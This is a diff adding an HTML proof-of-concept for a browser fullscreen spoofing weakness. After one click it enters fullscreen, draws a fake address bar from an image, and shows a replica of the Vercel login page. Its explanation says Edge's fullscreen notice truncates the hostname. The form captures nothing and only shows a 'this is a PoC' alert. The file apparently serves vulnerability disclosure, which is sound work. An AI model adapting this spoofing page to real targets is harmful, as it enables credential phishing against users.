@@ -1,0 +1,632 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login – Vercel</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        width: 100%;
+        min-height: 100%;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica,
+          Arial, sans-serif;
+        background: #ffffff;
+        color: #24292f;
+        font-size: 14px;
+      }
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        flex-direction: column;
+      }
+
+      /* --- State 1: trigger (butuh user gesture) --- */
+      .trigger-wrap {
+        position: fixed;
+        inset: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        gap: 16px;
+        background: #f6f8fa;
+        padding: 24px;
+      }
+
+      .trigger-btn {
+        padding: 12px 24px;
+        font-size: 16px;
+        font-weight: 600;
+        border-radius: 6px;
+        background-color: #000000;
+        color: #ffffff;
+        border: 1px solid rgba(27, 31, 36, 0.15);
+        cursor: pointer;
+      }
+
+      .trigger-btn:hover {
+        background-color: #1a1a1a;
+      }
+
+      .trigger-note {
+        font-size: 12px;
+        color: #57606a;
+        max-width: 480px;
+        text-align: center;
+        line-height: 1.5;
+      }
+
+      /* --- Panel perbandingan Chrome vs Edge --- */
+      .compare-box {
+        margin-top: 8px;
+        width: 100%;
+        max-width: 560px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        font-size: 13px;
+        line-height: 1.5;
+      }
+
+      .compare-row {
+        display: flex;
+        gap: 8px;
+        padding: 10px 14px;
+        border-radius: 6px;
+        border: 1px solid #d0d7de;
+        background: #ffffff;
+        text-align: left;
+      }
+
+      .compare-row.secure {
+        border-left: 4px solid #1f883d;
+      }
+
+      .compare-row.vuln {
+        border-left: 4px solid #cf222e;
+      }
+
+      .compare-row .label {
+        font-weight: 600;
+        color: #24292f;
+        flex-shrink: 0;
+      }
+
+      .compare-row.secure .label {
+        color: #1f883d;
+      }
+
+      .compare-row.vuln .label {
+        color: #cf222e;
+      }
+
+      .compare-row .value {
+        color: #57606a;
+      }
+
+      .compare-row code {
+        font-family:
+          ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+        font-size: 12px;
+        background: #f6f8fa;
+        padding: 1px 6px;
+        border-radius: 4px;
+        color: #24292f;
+      }
+
+      /* --- State 2: spoofing --- */
+      #spoof-root {
+        display: none;
+        width: 100%;
+        min-height: 100vh;
+        position: relative;
+        background: #000000;
+      }
+
+      #spoof-root.active {
+        display: block;
+      }
+
+      /* ============================================================
+         FAKE BROWSER CHROME (address bar image)
+         ============================================================ */
+      :root {
+        --ab-scale: 1;
+        --ab-height: 120px; /* fallback sebelum JS jalan */
+      }
+
+      .fake-chrome {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: calc(100% * var(--ab-scale));
+        z-index: 99999;
+        line-height: 0;
+        background: #202124;
+        border-bottom: 1px solid #000;
+        overflow: hidden;
+      }
+
+      .fake-chrome img {
+        display: block;
+        width: 100%;
+        height: auto;
+        user-select: none;
+        -webkit-user-drag: none;
+        pointer-events: none;
+      }
+
+      /* ============================================================
+         VERCEL LOGIN PAGE (dark theme)
+         ============================================================ */
+      .vercel-main {
+        min-height: 100vh;
+        background: #000000;
+        color: #ededed;
+        display: flex;
+        flex-direction: column;
+        padding-top: var(--ab-height);
+        position: relative;
+      }
+
+      /* Top bar */
+      .vercel-topbar {
+        position: absolute;
+        top: var(--ab-height);
+        left: 0;
+        right: 0;
+        height: 64px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0 24px;
+        z-index: 5;
+      }
+
+      .vercel-logo {
+        display: flex;
+        align-items: center;
+        color: #ffffff;
+        line-height: 0;
+      }
+
+      .vercel-logo svg {
+        width: 22px;
+        height: 20px;
+        fill: #ffffff;
+      }
+
+      .vercel-signup {
+        background: #000000;
+        color: #ededed;
+        border: 1px solid #333333;
+        border-radius: 8px;
+        padding: 8px 16px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        font-family: inherit;
+      }
+
+      .vercel-signup:hover {
+        background: #1a1a1a;
+      }
+
+      /* Center content */
+      .vercel-center {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 96px 24px 120px;
+      }
+
+      .vercel-h1 {
+        font-size: 32px;
+        font-weight: 700;
+        letter-spacing: -0.5px;
+        color: #ffffff;
+        margin-bottom: 32px;
+        text-align: center;
+      }
+
+      .vercel-form {
+        width: 100%;
+        max-width: 400px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .vercel-input {
+        width: 100%;
+        height: 48px;
+        padding: 0 16px;
+        font-size: 14px;
+        color: #ededed;
+        background: #000000;
+        border: 1px solid #333333;
+        border-radius: 8px;
+        outline: none;
+        font-family: inherit;
+        transition:
+          border-color 0.15s ease,
+          box-shadow 0.15s ease;
+      }
+
+      .vercel-input::placeholder {
+        color: #666666;
+      }
+
+      .vercel-input:focus {
+        border-color: #666666;
+        box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.08);
+      }
+
+      .vercel-btn {
+        width: 100%;
+        height: 48px;
+        padding: 0 16px;
+        font-size: 14px;
+        font-weight: 500;
+        border-radius: 8px;
+        cursor: pointer;
+        font-family: inherit;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        background: #000000;
+        color: #ededed;
+        border: 1px solid #333333;
+        transition: background 0.15s ease;
+      }
+
+      .vercel-btn:hover {
+        background: #1a1a1a;
+      }
+
+      .vercel-btn.primary {
+        background: #ffffff;
+        color: #000000;
+        border: 1px solid #ffffff;
+        font-weight: 600;
+        margin-top: 4px;
+      }
+
+      .vercel-btn.primary:hover {
+        background: #ededed;
+      }
+
+      .vercel-btn .icon {
+        width: 18px;
+        height: 18px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      }
+
+      .vercel-btn .icon svg {
+        width: 18px;
+        height: 18px;
+        display: block;
+      }
+
+      .vercel-btn-text {
+        background: none;
+        border: none;
+        color: #a1a1a1;
+        font-size: 14px;
+        padding: 8px 0;
+        cursor: pointer;
+        font-family: inherit;
+        margin-top: 4px;
+      }
+
+      .vercel-btn-text:hover {
+        color: #ededed;
+      }
+
+      .vercel-alt {
+        text-align: center;
+        font-size: 14px;
+        color: #a1a1a1;
+        margin-top: 12px;
+      }
+
+      .vercel-alt a {
+        color: #0090ff;
+        text-decoration: none;
+      }
+
+      .vercel-alt a:hover {
+        text-decoration: underline;
+      }
+
+      .vercel-footer {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        padding: 24px;
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        font-size: 13px;
+        color: #666666;
+        background: #000000;
+      }
+
+      .vercel-footer a {
+        color: #666666;
+        text-decoration: none;
+      }
+
+      .vercel-footer a:hover {
+        color: #ededed;
+      }
+
+      @media (max-width: 480px) {
+        .vercel-h1 {
+          font-size: 26px;
+        }
+        .vercel-center {
+          padding: 80px 20px 120px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- ===== State 1: trigger ===== -->
+    <div class="trigger-wrap" id="trigger-wrap">
+      <button class="trigger-btn" onclick="enterFullscreenSpoof()">
+        Login to Vercel
+      </button>
+
+      <p class="trigger-note">
+        Click the button to simulate a scenario where a victim opens a phishing
+        link that mimics the Vercel login page, then enters fullscreen mode. The
+        browser's fullscreen notification is the only remaining origin signal
+        the user can rely on.
+      </p>
+
+      <div class="compare-box">
+        <div class="compare-row secure">
+          <span class="label">Secure (Chrome):</span>
+          <span class="value">
+            notification shows the full hostname &mdash;
+            <code>fullscreen-test-chi.vercel.app</code>
+          </span>
+        </div>
+        <div class="compare-row vuln">
+          <span class="label">Vulnerable (Edge):</span>
+          <span class="value">
+            notification truncates to &mdash;
+            <code>vercel.app</code>
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== State 2: spoofing ===== -->
+    <div id="spoof-root">
+      <!-- Fake browser chrome (address bar image) -->
+      <div class="fake-chrome" aria-hidden="true">
+        <img id="fake-chrome-img" src="addressbar.png" alt="" />
+      </div>
+
+      <!-- Vercel login page -->
+      <main class="vercel-main">
+        <!-- Top bar: logo + Sign Up -->
+        <div class="vercel-topbar">
+          <div class="vercel-logo" aria-label="Vercel">
+            <svg viewBox="0 0 20 18" xmlns="http://www.w3.org/2000/svg">
+              <polygon points="10,0 20,18 0,18" fill="#ffffff" />
+            </svg>
+          </div>
+          <button class="vercel-signup" type="button">Sign Up</button>
+        </div>
+
+        <!-- Center content -->
+        <div class="vercel-center">
+          <h1 class="vercel-h1">Log in to Vercel</h1>
+
+          <form
+            class="vercel-form"
+            onsubmit="
+              event.preventDefault();
+              alert('Fake Vercel login — this is a PoC.');
+            "
+          >
+            <input
+              class="vercel-input"
+              type="email"
+              placeholder="Email Address"
+              autocomplete="email"
+            />
+
+            <button class="vercel-btn primary" type="submit">
+              Continue with Email
+            </button>
+
+            <button class="vercel-btn" type="button">
+              <span class="icon">
+                <!-- Google G -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                  <path
+                    fill="#4285F4"
+                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                  />
+                  <path
+                    fill="#34A853"
+                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                  />
+                  <path
+                    fill="#FBBC05"
+                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
+                  />
+                  <path
+                    fill="#EA4335"
+                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
+                  />
+                </svg>
+              </span>
+              Continue with Google
+            </button>
+
+            <button class="vercel-btn" type="button">
+              <span class="icon">
+                <!-- GitHub -->
+                <svg
+                  viewBox="0 0 16 16"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="#ffffff"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
+                  />
+                </svg>
+              </span>
+              Continue with GitHub
+            </button>
+
+            <button class="vercel-btn" type="button">
+              <span class="icon">
+                <!-- ChatGPT / OpenAI -->
+                <svg
+                  viewBox="0 0 24 24"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  stroke="#ffffff"
+                  stroke-width="1.6"
+                  stroke-linejoin="round"
+                >
+                  <path
+                    d="M12 3.5l7.5 4.3v8.4L12 20.5 4.5 16.2V7.8L12 3.5z M12 3.5v8.7 M12 12.2l7.5-4.4 M12 12.2l-7.5-4.4 M12 12.2v8.3"
+                  />
+                </svg>
+              </span>
+              Continue with ChatGPT
+            </button>
+
+            <button class="vercel-btn" type="button">
+              <span class="icon">
+                <!-- SAML SSO: lock -->
+                <svg
+                  viewBox="0 0 24 24"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  stroke="#ffffff"
+                  stroke-width="1.6"
+                >
+                  <rect x="4.5" y="10.5" width="15" height="10" rx="2" />
+                  <path d="M8 10.5V7.5a4 4 0 0 1 8 0v3" />
+                </svg>
+              </span>
+              Continue with SAML SSO
+            </button>
+
+            <button class="vercel-btn" type="button">
+              <span class="icon">
+                <!-- Passkey -->
+                <svg
+                  viewBox="0 0 24 24"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  stroke="#ffffff"
+                  stroke-width="1.6"
+                  stroke-linecap="round"
+                >
+                  <path d="M12 3a5 5 0 0 0-5 5v3" />
+                  <path d="M7 14v3.5a5 5 0 0 0 10 0" />
+                  <path d="M17 8a5 5 0 0 0-2.5-4.33" />
+                  <path d="M14 12v5.5" />
+                  <path d="M12 12v6" />
+                </svg>
+              </span>
+              Continue with Passkey
+            </button>
+
+            <button class="vercel-btn-text" type="button">
+              Show other options
+            </button>
+
+            <p class="vercel-alt">
+              Don't have an account?
+              <a href="#" onclick="event.preventDefault()">Sign Up</a>
+            </p>
+          </form>
+        </div>
+
+        <!-- Footer -->
+        <div class="vercel-footer">
+          <a href="#" onclick="event.preventDefault()">Terms</a>
+          <a href="#" onclick="event.preventDefault()">Privacy Policy</a>
+        </div>
+      </main>
+    </div>
+
+    <script>
+      const triggerWrap = document.getElementById("trigger-wrap");
+      const spoofRoot = document.getElementById("spoof-root");
+      const fakeChromeImg = document.getElementById("fake-chrome-img");
+
+      // ---- Sync tinggi fake chrome ke CSS variable ----
+      function syncChromeHeight() {
+        if (!fakeChromeImg || !fakeChromeImg.complete) return;
+        const h = fakeChromeImg.getBoundingClientRect().height;
+        if (h > 0) {
+          document.documentElement.style.setProperty("--ab-height", h + "px");
+        }
+      }
+      fakeChromeImg.addEventListener("load", syncChromeHeight);
+      window.addEventListener("resize", syncChromeHeight);
+      if (fakeChromeImg.complete) syncChromeHeight();
+
+      // ---- Fullscreen ----
+      function requestFullscreen(el) {
+        if (el.requestFullscreen) return el.requestFullscreen();
+        if (el.webkitRequestFullscreen) return el.webkitRequestFullscreen();
+        if (el.msRequestFullscreen) return el.msRequestFullscreen();
+        return Promise.reject(new Error("Fullscreen API not supported"));
+      }
+
+      function enterFullscreenSpoof() {
+        const el = document.documentElement;
+        requestFullscreen(el)
+          .then(() => {
+            triggerWrap.style.display = "none";
+            spoofRoot.classList.add("active");
+            requestAnimationFrame(syncChromeHeight);
+          })
+          .catch((err) => {
+            console.warn("Fullscreen request rejected:", err);
+            alert(
+              "Fullscreen ditolak oleh browser. PoC tidak bisa dijalankan.",
+            );
+          });
+      }
+
+      document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+          spoofRoot.classList.remove("active");
+          triggerWrap.style.display = "flex";
+        }
+      });
+    </script>
+  </body>
+</html>
